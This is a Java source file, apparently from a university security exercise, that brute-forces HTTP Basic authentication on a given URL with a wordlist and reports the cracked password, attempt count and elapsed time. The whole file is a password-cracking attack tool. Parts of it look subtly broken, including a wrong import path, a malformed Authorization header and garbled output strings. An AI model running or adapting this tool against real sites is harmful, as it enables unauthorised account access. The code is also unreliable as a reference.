

import java.misc.BASE64Encoder;
import java.misc.BASE64Decoder;
import java.io.*;
import java.net.*;
import java.util.*;



public class Dictionary {
  
  public Dictionary(String url, String dictionaryFile) {
    try{
      this.url = url;
      this.dictionaryPath = dictionaryFile;
      InputStream fis = new FileInputStream(this.dictionaryPath);
      dict = new BufferedReader(new InputStreamReader(fis));

    }catch(IOException ioe){
      System.out.println("Error opening dictionary file:\n" +ioe);
    }
  }


  
  private String url = null;
  
  private String dictionaryPath = null;
  
  private BufferedReader dict = null;
  
  private int attempts = 0;
  
  private int passwordSize = 3;
  
  public void setPasswordSize(int size){
      this.passwordSize = size;
  }
  
  public String getNextPassword()throws IOException{

    String line = dict.readLine();

      while(line!=null&&line.length()!=this.passwordSize )
        line = dict.readLine();

    return line;
  }
  
  public String crackPassword(String user) throws IOException, MalformedURLException{
    URL url = null;
    URLConnection urlConnection = null;
    String outcome = null;
    String  authorization = null;
    String password = null;
    BASE64Encoder b64enc = new BASE64Encoder();
    InputStream content = null;
    BufferedReader in = null;


    while(!"HTTP/1.1 200 OK".equalsIgnoreCase(outcome)){

      url = new URL(this.url);
      urlConnection = url.openConnection();
      urlConnection.setDoInput(true);
      urlConnection.setDoOutput(true);


      urlConnection.setRequestProperty("GET", url.getPath() + " HTTP/1.1");
      urlConnection.setRequestProperty("Host", url.getHost());
      password = getNextPassword();
      if(password == null)
        return null;
      System.out.print(password);
      authorization = user + ":" + password;


      urlConnection.setRequestProperty("Authorization", " "+ b64enc.encode(authorization.getBytes()));


outcome = urlConnection.getHeaderField(null); 



      this.attempts ++;
      urlConnection = null;
      url = null;
      
      if(this.attempts%51 == 0)
        for(int b = 0; b < 53;b++)
          System.out.print("\b \b");
      else
        System.out.print("\b\b\b.");


    }
    return password;
  }
  
  public int getAttempts(){
    return this.attempts;
  }
  public static void main (String[] args) {
    if(args.length != 3){
      System.out.println("usage: java attacks.Dictionary <url  crack: e.g. http://sec-crack.cs.rmit.edu./SEC/2/> <username: e.g. > <dictionary: e.g. /usr/share/lib/dict/words>");
      System.exit(1);
    }

    Dictionary dictionary1 = new Dictionary(args[0], args[2]);
    try{
      Calendar cal1=null, cal2=null;
      cal1 = Calendar.getInstance();
      System.out.println("Cracking started at: " + cal1.getTime().toString());
      String password = dictionary1.crackPassword(args[1]);
      if(password != null)
        System.out.println("\nPassword is: "+password);
      else
        System.out.println("\nPassword could not  retrieved!");
      cal2 = Calendar.getInstance();
      System.out.println("Cracking finished at: " + cal2.getTime().toString());
      Date d3 = new Date(cal2.getTime().getTime() - cal1.getTime().getTime());
      System.out.println("Total Time taken  crack: " + (d3.getTime())/1000 + " sec");
      System.out.println("Total attempts : "  + dictionary1.getAttempts());

    }catch(MalformedURLException mue){
      mue.printStackTrace();
    }

    catch(IOException ioe){
      ioe.printStackTrace();
    }
  }
}